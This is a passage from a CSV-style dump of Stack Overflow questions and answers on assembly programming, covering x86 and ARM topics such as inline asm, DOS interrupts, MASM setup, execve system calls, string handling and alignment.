<p>With current gcc6.2 and clang3.9, you still get separate <code>lock</code>ed operations even with <code>memory_order_relaxed</code> in the most obviously optimizable case.  (<a href=""http://gcc.godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(j:1,options:(compileOnChange:&#39;0&#39;),source:&#39;%23include+%3Catomic%3E%0A%0A%0Avoid+multiple_ops_relaxed(std::atomic%3Cunsigned+int%3E%26+num)+%7B%0A++num.fetch_add(+1,+std::memory_order_relaxed)%3B%0A++num.fetch_add(-1,+std::memory_order_relaxed)%3B%0A++num.fetch_add(+6,+std::memory_order_relaxed)%3B%0A++num.fetch_add(-5,+std::memory_order_relaxed)%3B%0A++//num.fetch_add(-1,+std::memory_order_relaxed)%3B%0A%7D&#39;),l:&#39;5&#39;,n:&#39;1&#39;,o:&#39;C%2B%2B+source+%231&#39;,t:&#39;0&#39;)),k:50,l:&#39;4&#39;,m:100,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((g:!((h:compiler,i:(compiler:g62,filters:(b:&#39;0&#39;,commentOnly:&#39;0&#39;,directives:&#39;0&#39;,intel:&#39;0&#39;),options:&#39;-std%3Dgnu%2B%2B11+-Wall+-Wextra+-O3++-fverbose-asm&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;%231+with+x86-64+gcc+6.2&#39;,t:&#39;0&#39;)),k:50,l:&#39;4&#39;,m:84.06862745098039,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:output,i:(compiler:1,editor:1),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;%231+with+x86-64+gcc+6.2&#39;,t:&#39;0&#39;)),l:&#39;4&#39;,m:15.931372549019606,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;)),k:50,l:&#39;3&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),l:&#39;2&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),version:4"" rel=""noreferrer"">Godbolt compiler explorer</a> so you can see if the latest versions are different.)</p>

<pre><code>void multiple_ops_relaxed(std::atomic&lt;unsigned int&gt;&amp; num) {
  num.fetch_add( 1, std::memory_order_relaxed);
  num.fetch_add(-1, std::memory_order_relaxed);
  num.fetch_add( 6, std::memory_order_relaxed);
  num.fetch_add(-5, std::memory_order_relaxed);
  //num.fetch_add(-1, std::memory_order_relaxed);
}

multiple_ops_relaxed(std::atomic&lt;unsigned int&gt;&amp;):
    lock add        DWORD PTR [rdi], 1
    lock sub        DWORD PTR [rdi], 1
    lock add        DWORD PTR [rdi], 6
    lock sub        DWORD PTR [rdi], 5
    ret
</code></pre>
","39396999"
"Converting from lower case to upper case","9204","","<p>I am trying to convert from lower case to upper case. I know it can easily be done by,</p>

<pre><code>SUB AL, 20H
</code></pre>

<p>But I am have been given another solution which is,</p>

<pre><code>AND AL, 0DFH
</code></pre>

<p>Please help me understand this. Thanks</p>
","<p>Look at the bit patterns:</p>

<ul>
<li>A (0x41): <code>0100 0001</code></li>
<li>a (0x61): <code>0110 0001</code></li>
<li>M (0x4d): <code>0100 1101</code></li>
<li>m (0x6d): <code>0110 1101</code></li>
<li>Z (0x5a): <code>0101 1010</code></li>
<li>z (0x7a): <code>0111 1010</code></li>
</ul>

<p>Lower case ASCII is upper case ASCII + 0x20 (<code>0010 0000</code>) - i.e. the same bit pattern with <em>the sixth bit set</em>.</p>

<p>0xdf is <code>1101 1111</code> in binary. AND:ing AL with that will set the sixth bit to zero but preserve the other bit values.</p>
","10394595"
"Using Visual Studio 2008 to Assemble, Link, Debug, and Execute MASM 6.11 Assembly Code","9191","","<p>I would like to use Visual Studio 2008 to the greatest extent possible while effectively compiling/linking/building/etc code as if all these build processes were being done by the tools provided with MASM 6.11. The exact version of MASM does not matter, so long as it's within the 6.x range, as that is what my college is using to teach 16-bit assembly.</p>

<p>I have done some research on the subject and have come to the conclusion that there are several options:</p>

<ol>
<li>Reconfigure VS to call the MASM 6.11 executables with the same flags, etc as MASM 6.11 would natively do.</li>
<li>Create intermediary batch file(s) to be called by VS to then invoke the proper commands for MASM's linker, etc.</li>
<li>Reconfigure VS's built-in build tools/rules (assembler, linker, etc) to provide an environment identical to the one used by MASM 6.11.</li>
</ol>

<p>Option (2) was brought up when I realized that the options available in VS's ""External Tools"" interface may be insufficient to correctly invoke MASM's build tools, thus a batch file to interpret VS's strict method of passing arguments might be helpful, as a lot of my learning about how to get this working involved my manually calling ML.exe, LINK.exe, etc from the command prompt.</p>

<p>Below are several links that may prove useful in answering my question. Please keep in mind that I have read them all and none are the actual solution. I can only hope my specifying MASM 6.11 doesn't prevent anyone from contributing a perhaps more generalized answer.</p>

<p>Similar method used to Option (2), but users on the thread are not contactable:<br>
<a href=""http://www.codeguru.com/forum/archive/index.php/t-284051.html"" rel=""nofollow noreferrer"">http://www.codeguru.com/forum/archive/index.php/t-284051.html</a><br>
(also, I have my doubts about the necessity of an intermediary batch file)</p>

<p>Out of date explanation to my question:<br>
<a href=""http://www.cs.fiu.edu/~downeyt/cop3402/masmaul.html"" rel=""nofollow noreferrer"">http://www.cs.fiu.edu/~downeyt/cop3402/masmaul.html</a></p>

<p>Probably the closest thing I've come to a definitive solution, but refers to a suite of tools from something besides MASM, also uses a batch file:<br>
<a href=""http://www.kipirvine.com/asm/gettingStarted/index.htm#16-bit"" rel=""nofollow noreferrer"">http://www.kipirvine.com/asm/gettingStarted/index.htm#16-bit</a></p>

<p>I apologize if my terminology for the tools used in each step of the code -> exe process is off, but since I'm trying to reproduce the entirety of steps in between completion of writing the code and generating an executable, I don't think it matters much.</p>
","<p>There is a MASM rules file located at (32-bit system remove <code>(x86)</code>):</p>

<pre><code>C:\Program Files (x86)\Microsoft Visual Studio 9.0\VC\VCProjectDefaults\masm.rules
</code></pre>

<p>Copy that file to your project directory, and add it to the Custom Build Rules for your project. Then ""Modify Rule File..."", select the MASM build rule and ""Modify Build Rule..."".</p>

<p>Add a property:</p>

<ul>
<li>User property type: <strong>String</strong></li>
<li>Default value: <strong>*.inc</strong></li>
<li>Description: <strong>Add additional MASM file dependencies.</strong></li>
<li>Display name: <strong>Additional Dependencies</strong></li>
<li>Is read only: <strong>False</strong></li>
<li>Name: <strong>AdditionalDependencies</strong></li>
<li>Property page name: <strong>General</strong></li>
<li>Switch: <strong>[value]</strong></li>
</ul>

<p>Set the Additional Dependencies value to <strong>[AdditionalDependencies]</strong>. The build should now automatically detect changes to <code>*.inc</code>, and you can edit the properties for an individual asm file to specify others.</p>
","2403173"
"Assembly code to display string","9181","","<p>I have this piece of assembly code to accept a string and display the string back.</p>

<p>My problem is I'm not able to figure out how exactly the name is getting stored in <code>name1</code> as we are using buff to store the input from the user.</p>

<p>I know that</p>

<pre><code>buff label byte
maxchar db 50
readchar db 0
name1 db 48 dup(0)
</code></pre>

<p>is got something to do with this. But I'm not able to understand the working.</p>

<pre><code>.model small
.stack
.data
    buff label byte
    maxchar db 50
    readchar db 0
    name1 db 48 dup(0)
    m1 db 10,13,""enter name: $""
    m2 db 10,13,""your name is: $""
.code
    mov ax, @data
    mov ds, ax
    lea dx, m1
    mov ah, 09
    int 21h
    lea dx, buff
    mov ah, 10
    int 21h


    mov ah,0
    mov al, readchar
    add ax, 2
    mov si, al
    mov buff[si],24H ;ascii code for $ to terminate string
    lea dx, m2
    mov ah, 9
    int 21h
    lea dx, name1
    mov ah, 09
    int 21h

    mov ah, 4ch
    int 21h
end
</code></pre>

<p>please help!</p>

<p>thank you.</p>
","<p>The input is read using DOS function 0x0a (or decimal 10 in your code) which performs buffered input.  The DS:DX parameter points to a buffer that has the following format, which is at the location labeled <code>buff</code> (or equivalently <code>maxchar</code>) in your program:</p>

<pre><code> offset    meaning
 ------  -------------
    0      Number of bytes available for the input data (starting at offset 2)
    1      A location for DOS to put the number of characters read into the buffer
    2      A buffer of bytes that can hold the number of characters specified in 
           offset 0
</code></pre>

<p>So in your code, DS:DX points to <code>buff</code> which indicates that up to 50 characters can be put into the buffer at <code>name1</code>.  It looks like the code has a potential problem since there are only 48 bytes in the buffer, but the data structure indicates that there are 50 bytes. So it's possible that the input will overwrite the first two bytes of <code>m1</code>.  Now, assembly programs - especially old ones - are known for performing all sorts of tricks to save space. <code>m1</code> isn't used after the call to DOS function 0x0a, so this might have been intentional (but if so, I'm not sure why more of <code>m1</code> wasn't made available).  I'd guess that it's unintentional, and the bug just never manifested into anything noticeable.</p>
","8665291"
"What is the meaning of each line of the assembly output of a C hello world?","9175","","<p>I ran gcc -S over this:</p>

<pre><code>int main()
{
printf (""Hello world!"");
}
</code></pre>

<p>and I got this assembly code:</p>

<pre><code>        .file   ""test.c""
        .section        .rodata
.LC0:
        .string ""Hello world!""
        .text
.globl main
        .type   main, @function
main:
        leal    4(%esp), %ecx
        andl    $-16, %esp
        pushl   -4(%ecx)
        pushl   %ebp
        movl    %esp, %ebp
        pushl   %ecx
        subl    $20, %esp
        movl    $.LC0, (%esp)
        call    printf
        addl    $20, %esp
        popl    %ecx
        popl    %ebp
        leal    -4(%ecx), %esp
        ret
        .size   main, .-main
        .ident  ""GCC: (GNU) 4.3.0 20080428 (Red Hat 4.3.0-8)""
        .section        .note.GNU-stack,"""",@progbits
</code></pre>

<p>I am curious to understand this output. Can someone share some pointers in understanding this output, or if someone could mark comments against each of these lines/group of lines explaining what it does it would be great. </p>
","<p>Here how it goes:</p>

<pre><code>        .file   ""test.c""
</code></pre>

<p>The original source file name (used by debuggers).</p>

<pre><code>        .section        .rodata
.LC0:
        .string ""Hello world!""
</code></pre>

<p>A zero-terminated string is included in the section "".rodata"" (""ro"" means ""read-only"": the application will be able to read the data, but any attempt at writing into it will trigger an exception).</p>

<pre><code>        .text
</code></pre>

<p>Now we write things into the "".text"" section, which is where code goes.</p>

<pre><code>.globl main
        .type   main, @function
main:
</code></pre>

<p>We define a function called ""main"" and globally visible (other object files will be able to invoke it).</p>

<pre><code>        leal    4(%esp), %ecx
</code></pre>

<p>We store in register <code>%ecx</code> the value <code>4+%esp</code> (<code>%esp</code> is the stack pointer).</p>

<pre><code>        andl    $-16, %esp
</code></pre>

<p><code>%esp</code> is slightly modified so that it becomes a multiple of 16. For some data types (the floating-point format corresponding to C's <code>double</code> and <code>long double</code>), performance is better when the memory accesses are at addresses which are multiple of 16. This is not really needed here, but when used without the optimization flag (<code>-O2</code>...), the compiler tends to produce quite a lot of generic useless code (i.e. code which could be useful in some cases but not here).</p>

<pre><code>        pushl   -4(%ecx)
</code></pre>

<p>This one is a bit weird: at that point, the word at address <code>-4(%ecx)</code> is the word which was on top of the stack prior to the <code>andl</code>. The code retrieves that word (which should be the return address, by the way) and pushes it again. This kind of emulates what would be obtained with a call from a function which had a 16-byte aligned stack. My guess is that this <code>push</code> is a remnant of an argument-copying sequence. Since the function has adjusted the stack pointer, it must copy the function arguments, which were accessible through the old value of the stack pointer. Here, there is no argument, except the function return address. Note that this word will not be used (yet again, this is code without optimization).</p>

<pre><code>        pushl   %ebp
        movl    %esp, %ebp
</code></pre>

<p>This is the standard function prologue: we save <code>%ebp</code> (since we are about to modify it), then set <code>%ebp</code> to point to the stack frame. Thereafter, <code>%ebp</code> will be used to access the function arguments, making <code>%esp</code> free again. (Yes, there is no argument, so this is useless for that function.)</p>

<pre><code>        pushl   %ecx
</code></pre>

<p>We save <code>%ecx</code> (we will need it at function exit, to restore <code>%esp</code> at the value it had before the <code>andl</code>).</p>

<pre><code>        subl    $20, %esp
</code></pre>

<p>We reserve 32 bytes on the stack (remember that the stack grows ""down""). That space will be used to storea the arguments to <code>printf()</code> (that's overkill, since there is a single argument, which will use 4 bytes [that's a pointer]).</p>

<pre><code>        movl    $.LC0, (%esp)
        call    printf
</code></pre>

<p>We ""push"" the argument to <code>printf()</code> (i.e. we make sure that <code>%esp</code> points to a word which contains the argument, here <code>$.LC0</code>, which is the address of the constant string in the rodata section). Then we call <code>printf()</code>.</p>

<pre><code>        addl    $20, %esp
</code></pre>

<p>When <code>printf()</code> returns, we remove the space allocated for the arguments. This <code>addl</code> cancels what the <code>subl</code> above did.</p>

<pre><code>        popl    %ecx
</code></pre>

<p>We recover <code>%ecx</code> (pushed above); <code>printf()</code> may have modified it (the call conventions describe which register can a function modify without restoring them upon exit; <code>%ecx</code> is one such register).</p>

<pre><code>        popl    %ebp
</code></pre>

<p>Function epilogue: this restores <code>%ebp</code> (corresponding to the <code>pushl %ebp</code> above).</p>

<pre><code>        leal    -4(%ecx), %esp
</code></pre>

<p>We restore <code>%esp</code> to its initial value. The effect of this opcode is to store in <code>%esp</code> the value <code>%ecx-4</code>. <code>%ecx</code> was set in the first function opcode. This cancels any alteration to <code>%esp</code>, including the <code>andl</code>.</p>

<pre><code>        ret
</code></pre>

<p>Function exit.</p>

<pre><code>        .size   main, .-main
</code></pre>

<p>This sets the size of the <code>main()</code> function: at any point during assembly, ""<code>.</code>"" is an alias for ""the address at which we are adding things right now"". If another instruction was added here, it would go at the address specified by ""<code>.</code>"". Thus, ""<code>.-main</code>"", here, is the exact size of the code of the function <code>main()</code>. The <code>.size</code> directive instructs the assembler to write that information in the object file.</p>

<pre><code>        .ident  ""GCC: (GNU) 4.3.0 20080428 (Red Hat 4.3.0-8)""
</code></pre>

<p>GCC just loves to leave traces of its action. This string ends up as a kind of comment in the object file. The linker will remove it.</p>

<pre><code>        .section        .note.GNU-stack,"""",@progbits
</code></pre>

<p>A special section where GCC writes that the code can accommodate a non-executable stack. This is the normal case. Executable stacks are needed for some special usages (not standard C). On modern processors, the kernel can make a non-executable stack (a stack which triggers an exception if someone tries to execute as code some data which is on the stack); this is viewed by some people as a ""security feature"" because putting code on the stack is a common way to exploit buffer overflows. With this section, the executable will be marked as ""compatible with a non-executable stack"" which the kernel will happily provide as such.</p>
","5329669"
"ASM in C gives an error with -std=c99","9080","","<p>I'm now willing to compile my project with <code>-std=c99</code> and I'm facing an error I'm not understanding for the moment. This line :</p>

<pre><code>my_type* td = ({ register kmy_type* arg0 asm(""eax""); arg0; });
</code></pre>

<p>gives me the following error only in C99 :</p>

<pre><code>warning: ISO C forbids nested functions
error: syntax error before ‘asm’
error: ‘arg0’ undeclared (first use in this function)
error: (Each undeclared identifier is reported only once
error: for each function it appears in.)
warning: ISO C forbids braced-groups within expressions
</code></pre>

<p>Any clues are welcome to help me understanding what this means. I didn't write this line and I'm also not sure to understand what is its purpose.</p>
","<p>The line</p>

<pre><code>my_type* td = ({ register my_type* arg0 asm(""eax""); arg0; });
</code></pre>

<p>should get a value in the <code>eax</code> register, interpreted as a pointer, into <code>td</code> variable. However, it uses lots of GNU extensions, particularly statement expressions and this use of <code>asm</code> (explicit register allocation). I'd suggest you to switch to -std=gnu99 (or whatever it's called). Otherwise, you might want to play with double underscores (eg. <code>asm</code> -> <code>__asm</code>) or the <code>__extension__</code> keyword, but I don't know if it'll help in c99 mode.</p>

<p>Edit: I just tried it and simply changing <code>asm</code> to <code>__asm</code> works.</p>
","755536"
"How do you use printf from Assembly?","9063","","<p>I have an MSVC++ project set up to compile and run assembly code.</p>

<p>In main.c:</p>

<pre><code>#include &lt;stdio.h&gt;

void go() ;

int main()
{
  go() ; // call the asm routine
}
</code></pre>

<p>In go.asm:</p>

<pre><code>.586
.model flat, c
.code

go PROC
  invoke puts,""hi""
  RET
go ENDP

end
</code></pre>

<p>But when I compile and run, I get an error in go.asm:</p>

<blockquote>
error A2006: undefined symbol : puts
</blockquote>

<p>How do I define the symbols in <code>&lt;stdio.h&gt;</code> for the .asm files in the project?</p>
","<p>Here's what I have.</p>

<p>It works!!</p>

<pre>
.586
.model flat,c

<b>printf PROTO C :VARARG  ; The secret sauce..</b> a prototype of printf

.data
msgHello1 BYTE ""GREETINGS AND WELCOME TO EARTH!"",0 

.code

go PROC
  push OFFSET msgHello1
  call printf
  add esp, 4 ;  Stack cleaning
  RET
go ENDP

end
</pre>

<ul>
<li><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions"" rel=""nofollow"">""stack cleaning""</a></li>
<li><a href=""https://cmlmail.csie.ntu.edu.tw/pipermail/assembly/Week-of-Mon-20061204/000042.html"" rel=""nofollow"">How to call variadic argument function such as printf</a></li>
</ul>
","4568369"
"Linux system call table or cheetsheet in assembly language","9035","","<p>Does anyone know where to find a summary table or cheatsheet for the Linux system call in Assembly language? I am invoking Linux system calls through <em>int 0x80</em> instruction and I need to refer to <em>what register contains what value</em> from time to time.</p>

<p>Thanks.</p>
","<p><a href=""http://syscalls.kernelgrok.com/"" rel=""noreferrer"">Here's a really good online reference</a> with links to documentation and kernel source code.</p>
","3615018"
"execve() failing to launch program in C","9031","","<p>I am trying to spawn a new process using <code>execve()</code> from <code>unistd.h</code> on Linux. I have tried passing it the following parameters <code>execve(""/bin/ls"", ""/bin/ls"", NULL);</code> but get no result. I do not get an error either, the program just exits. Is there a reason why this is happening? I have tried launching it as root and regular user. The reason I need to use <code>execve()</code> is because I am trying to get it to work in an assembly call like so</p>

<pre><code>program: db ""/bin/ls"",0

mov eax, 0xb
mov ebx, program
mov ecx, program
mov edx, 0
int 0x80
</code></pre>

<p>Thank you!</p>
","<p>The arguments that you're passing to <code>execve</code> are wrong. Both the second and third <em>must</em> be an array of char pointers with a NULL sentinel value, not a single pointer.</p>

<p>In other words, something like:</p>

<pre><code>#include &lt;unistd.h&gt;
int main (void) {
    char * const argv[] = {""/bin/ls"", NULL};
    char * const envp[] = {NULL};
    int rc = execve (""/bin/ls"", argv, envp);
    return rc;
}
</code></pre>

<p>When I run that, I do indeed get a list of the files in the current directory.</p>
","8469864"
"Assembly Language x8086 - Getting User input","8995","","<p>I am stuck on a problem I have for a homework assignment that is asking me to ask the user fora digit ranging from 1 digit to 5 digits (eg. they can input 1, 12, 123, 1234) I know how to ask the user for whatever number they want, using a loop and then using the mov ah, 1h function, but I want to take the user's input, let's say 123, and then store that number in a variable that I've created, Y. Then I want to process it, I already know how to process the number, but only when I've already declared the number in the variable ( Y dw 123), but since I have to ask the user for an input, I have to leave the variable uninitialized ( Y dw ?). Now since I was stuck I decided to just create this instead of ""Y dw ?"",   ""Y dw 0,0,0,0,0"", I did this so that I can manual store enter number into that Y variable.</p>

<p>Basically, I am wondering how I can take each number the user inputs and store it in my Y variable where I can use it just if it was ""Y dw 123"" </p>

<p>Here is what I have so far:</p>

<pre><code>title lab6 (lab6.asm)

.model small
.stack 100h
.data

    Y dw 0,0,0,0,0 ,0dh, 0ah
    W dw ?
    Sum dw ? 
    printSum db ""The Sum is: ""    
    sumMessage db 0,0,0,0,0     ,0dh, 0ah
    printW db ""W is: "" 
    wMessage db 0,0,0,0,0   ,0dh, 0ah, '$'  


.code
main proc
    mov ax,@data
    mov ds,ax

    mov bx, 0  
        mov si, 1
        loop1:
            mov ax, 0
            mov ah, 1h
            int 21h   
            cmp al, 0dh 
            je endloop 
            mov bl, al 
            mov Y+si, ax 
            inc si
        loop loop1
        endloop: 
        mov ax, 0    
       mov Y, bx   



    mov ax,Y     ;Store Y in ax register
    sub ax,1
    mov Y, ax
    mov ax, 0

    mov Sum,36         ; add 36 to Sum
    mov bx,Y
    add Sum,bx         ; add 36 and Y into Sum
    mov ax,Y

    mov bx,4            ; take Y and divide by 4
    mov dx,0
    idiv bx
    add Sum,ax  

    mov ax,Y           ;take Y and divide by 100
    mov bx,100
    mov dx,0
    idiv bx
    add Sum,ax  

    mov bx,7
    mov dx,0                        ; calculate W
    idiv bx
    mov W,dx
    add W,1
    mov dx, W    

    add dl, 30h
    mov wMessage+1, dl  

    mov ax, 0
    mov dx, 0 
    mov ax,Sum  
    mov cx, 10            ;start modding the number 2553
    idiv cx   

    mov si, 4

    sumLoop:                   ;Loop to mod and store 2553 into sumMessage
         add dl, 30h
         mov sumMessage+[si], dl 
         mov dx, 0 
         mov cx, 10 
         idiv cx
         dec si   
         cmp si, 0h
         je endSum

    loop sumLoop                

    endSum: 


    mov si, 0
    mov cl, printSum

    L1:                              ;Loop to print out ""Sum is : 2553
        mov al, 0
        mov al, printSum[si]
        inc si 
        cmp al, '$'
        je end_loop
        mov dl, al   
        mov ah, 2h
        int 21h  

    loop L1:  

    end_loop:


    mov ax,4C00h
    int 21h

main endp  
end main
</code></pre>

<p>For the code that I have now if I enter 123 as the user input it gives me that the Sum is : 0098, and W is 1, which shouldn't be the case, the Sum should actually be 0189, and the W is 6. Also I was wondering how I would take out the leading 0's.</p>

<p>Here are the instructions for this assignment:</p>

<p>Write a program that computes the following:</p>

<p>Y = (Get user input)</p>

<p>Y= Y-1</p>

<p>Sum = 36 + Y + (Y/4) + (Y/100)</p>

<p>W = Sum % 7 + 1</p>

<p>Output W, Sum</p>

<p>Note: You may not use any library functions</p>

<p>If my question is still unclear please tell me so I may attempt to ask my question clearly so what others may understand.</p>

<p>Thanks!</p>
","<p>Try something like this to input a number:</p>

<pre><code>        mov     cx, 10
        mov     bx, 0  
loop1:
        mov     ax,0100h
        int     21h   
        cmp     al,0dh 
        je      endloop
        and     ax,0fh
        xchg    ax,bx
        mul     cx
        add     bx,ax
        jmp     loop1
endloop: 
        mov Y, bx
</code></pre>
","26692024"
"Assembly difference between TASM and MASM","8994","","<p>I am learning TASM at University, but information regarding TASM on the web seems to be very limited. I have found more information on MASM.</p>

<p>My question is, what is the different between MASM and TASM?</p>
","<p>There aren't so much differences, but there are some.
Check out this article: <a href=""http://faqs.cs.uu.nl/na-dir/assembly-language/x86/borland.html"">http://faqs.cs.uu.nl/na-dir/assembly-language/x86/borland.html</a>
Look for 'ideal' mode; btw, TASM can work with MASM syntax.</p>
","13568121"
"How to manipulate strings with x86 assembly?","8988","","<p>I'm in the process of writing an assembly program that takes two strings as input and concatenates them. Here's what I have: <em>(using NASM syntax)</em></p>

<pre><code>    SECTION .data
hello:  db ""Hello "",0
world:  db ""world!"",0

    SECTION .text

; do the concatenation
</code></pre>

<p>Since I've never done any work with strings in x86 assembly before, I need to know how storing and manipulating strings work in the first place.</p>

<p>I'm guessing that once the length of each string is known, that concatenating would simply involve moving chunks of memory around. This part can be simplified by using <code>libc</code>. (I can use <code>strlen()</code> and <code>strcat()</code>.)</p>

<p>My real problem is that I'm not familiar with the way strings are stored in x86 assembly. Do they just get added to the stack...? Do they go on a heap somewhere? Should I use <code>malloc()</code> (somehow)?</p>
","<p>The strings in your example are stored the same way a global character array would be stored by a C program.  They're just a series of bytes in the data section of your executable.  If you want to concatenate them, you're going to need some space to do it - either do it on the stack, or call <code>malloc()</code> to get yourself some memory.  As you say, you can just use <code>strcat()</code> if you are willing to call out to <code>libc</code>.  Here's a quick example I made (AT&amp;T syntax), using a global buffer to concatenate the strings, then print them out:</p>

<pre><code>  .data
hello:
  .asciz ""Hello ""
world:
  .asciz ""world!""
buffer:
  .space 100

  .text
  .globl _main
  .globl _puts
  .globl _strcat

_main:
  push  %rbp
  mov   %rsp, %rbp
  leaq  buffer(%rip), %rdi
  leaq  hello(%rip), %rsi
  callq _strcat
  leaq  buffer(%rip), %rdi
  leaq  world(%rip), %rsi
  callq _strcat
  leaq  buffer(%rip), %rdi
  callq _puts
  mov   $0, %rax
  pop   %rbp
  retq
</code></pre>
","3681470"
"Register addressing mode vs Direct addressing mode","8982","","<p>I encountered this question in a test paper. It stated,
Which of the given addressing modes is faster? Why?</p>

<ol>
<li>Register addressing mode</li>
<li>Direct addressing mode</li>
</ol>

<p>Now according to me register addressing mode should be faster as register is the fastest memory location in the computer. Is this the correct answer to it?</p>

<p>Please help out. Thanks</p>
","<p>Register accesses are the fastest. However, memory accesses can be as fast if the memory data that you're accessing is already in the CPU's data cache.</p>
","10410743"
"Why does the ARM PC register point to the instruction after the next one to be executed?","8980","","<p>According to the ARM IC.</p>

<blockquote>
  <p>In ARM state, the value of the PC is the address of the current instruction plus 8 bytes.</p>
  
  <p>In Thumb state:</p>
  
  <ul>
  <li>For B, BL, CBNZ, and CBZ instructions, the value of the PC is the address of the current instruction plus 4 bytes.</li>
  <li>For all other instructions that use labels, the value of the PC is the address of the current instruction plus 4 bytes, with bit[1] of the result cleared to 0 to make it word-aligned.</li>
  </ul>
</blockquote>

<p>Simply saying, the value of the PC register points to the instruction after the next instruction. This is the thing I don't get. Usually (particularly on the x86) program counter register is used to point to the address of the next instruction to be executed.</p>

<p>So, what are the premises underlying that? Conditional execution, maybe?</p>
","<p>It's a nasty bit of legacy abstraction leakage.</p>

<p>The original ARM design had a 3-stage pipeline (fetch-decode-execute). To simplify the design they chose to have the PC read as the value currently on the instruction fetch address lines, rather than that of the currently executing instruction from 2 cycles ago. Since most PC-relative addresses are calculated at link time, it's easier to have the assembler/linker compensate for that 2-instruction offset than to design all the logic to 'correct' the PC register.</p>

<p>Of course, that's all firmly on the ""things that made sense 30 years ago"" pile. Now imagine what it takes to keep a meaningful value in that register on today's 15+ stage, multiple-issue, out-of-order pipelines, and you might appreciate why it's hard to find a CPU designer these days who thinks exposing the PC as a register is a good idea.</p>

<p>Still, on the upside, at least it's not quite as horrible as <a href=""http://en.wikipedia.org/wiki/Delay_slot"" rel=""noreferrer"">delay slots</a>. Instead, contrary to what you suppose, having every instruction execute conditionally was really just another optimisation around that prefetch offset. Rather than always having to take pipeline flush delays when branching around conditional code (or still executing whatever's left in the pipe like a crazy person), you can avoid very short branches entirely; the pipeline stays busy, and the decoded instructions can just execute as NOPs when the flags don't match<sup>*</sup>. Again, these days we have effective branch predictors and it ends up being more of a hindrance than a help, but for 1985 it was cool.</p>

<p><sub>* <a href=""https://soundcloud.com/university-of-cambridge/a-history-of-the-arm-architecture-and-the-lessons-learned-while-building-it"" rel=""noreferrer""><em>""...the instruction set with the most NOPs on the planet.""</em></a></sub></p>
","24092329"
"x86 - C's sscanf function","8979","","<p>So I have the following code segment in x86 assembly:</p>

<pre><code>mov $0x0, %eax
callq  400ac8 &lt;__isoc99_sscanf@plt&gt;
cmp    $0x5,%eax
jg     40152d &lt;this_function+0x3d&gt;   -----&gt; jumps to add two lines down
callq  4014b a &lt;error_program&gt;
add    $0x18,%rsp
retq
</code></pre>

<p>Now in the first line, it sets %eax as a zero. It then calls sscanf and then checks whether %eax is 5. If it is larger than 5, it will continue otherwise terminate. So a simple C code which I made:</p>

<pre><code>eax = 0;
sscanf();
if (eax &lt; 5) error_program();
return;
</code></pre>

<p>This is an object dump of a binary file so I am sure that it is correct. However, eax will always be zero and the error will fire up. Am I right on that? Or is it possible that sscanf would manipulate eax?</p>

<p>Thanks</p>
","<p>It is common for functions to pass the return value back in eax; at the very least, it is not guaranteed to be preserved.  So perhaps this code is checking to make sure that sscanf is finding at least 5 items?</p>
","8966305"
"When should explicit alignment directives be used in assembly?","8971","","<p>I'm spending some time on assembly programming (Gas, in particular) and recently I learned about the align directive. I think I've understood the very basics, but I would like to gain a deeper understanding of its nature and when to use alignment.</p>

<p>For instance, I wondered about the assembly code of a simple C++ switch statement. I know that under certain circumstances switch statements are based on jump tables, as in the following few lines of code:</p>

<pre><code>    .section    .rodata
    .align 4
    .align 4
.L8:
    .long   .L2
    .long   .L3
    .long   .L4
    .long   .L5
    ...
</code></pre>

<p>.align 4 aligns the following data on the next 4-byte boundary which ensures that fetching these memory locations is efficient, right? I think this is done because there might be things happening before the switch statement which caused misalignment. But why are there actually two calls to .align? Are there any rules of thumb when to call .align or should it simply be done whenever a new block of data is stored in memory and something prior to this could have caused misalignment?</p>

<p>In case of arrays, it seems that alignment is done on 32-byte boundaries as soon as the array occupies at least 32 byte. Is it more efficient to do it this way or is there another reason for the 32-byte boundary?</p>

<p>I'd appreciate any explanation or hint on literature.</p>
","<p>There are more than one <code>.align</code> directives just because of the way the compiler works internally; one would have been sufficient and emitting only one takes extra work.</p>

<p>As far as alignment in general, it's a complex topic but here's an article for Intel x64 that discusses some of the issues you are interested in:</p>

<ul>
<li><a href=""http://software.intel.com/en-us/articles/data-alignment-when-migrating-to-64-bit-intel-architecture/"" rel=""noreferrer"">Data Alignment when Migrating to 64-Bit Intel® Architecture</a></li>
</ul>

<p>Other architecture can be vastly different.</p>
","4568085"
"gcc inline assembly error ""operand type mismatch for mov""","8954","","<pre><code>//quick inline asm statements performing the swap_byte for key_scheduling
inline void swap_byte(unsigned char *x, unsigned char *y)
{
 unsigned char t;
 asm(""movl %1, %%eax;""
     ""movl %%eax, %0;""
     :""=r""(t)
     :""r""(*x)
     :""%eax"");
 asm(""movl %1, %%eax;""
     ""movl %%eax, %0;""
     :""=r""(*x)
     :""r""(*y)
     :""%eax"");
 asm(""movl %1, %%eax;""
     ""movl %%eax, %0;""
     :""=r""(*y)
     :""r""(t)
     :""%eax"");       
}
</code></pre>

<p>Here I am trying to swap the char from <code>x</code> and store in <code>y</code>, and the same for <code>y</code> to <code>x</code>.
I have compiled these instructions by changing <code>movl</code> to <code>mov</code> but with no success. Where is the problem in compiling/linking?</p>

<p>Here is the output from compiling in cygwin:</p>

<pre><code>$ gcc rc4_main.c -o rc4ex
/tmp/ccy0wo6H.s: Assembler messages:
/tmp/ccy0wo6H.s:18: Error: operand type mismatch for `mov'
/tmp/ccy0wo6H.s:18: Error: operand type mismatch for `mov'
/tmp/ccy0wo6H.s:26: Error: operand type mismatch for `mov'
/tmp/ccy0wo6H.s:26: Error: operand type mismatch for `mov'
/tmp/ccy0wo6H.s:34: Error: operand type mismatch for `mov'
/tmp/ccy0wo6H.s:34: Error: operand type mismatch for `mov'
</code></pre>
","<pre><code>unsigned char t;
asm(""movl %1, %%eax;""
     ""movl %%eax, %0;""
     :""=r""(t)  /* &lt;--here */
     :""r""(*x)  /* &lt;-- and here */
     :""%eax"");
</code></pre>

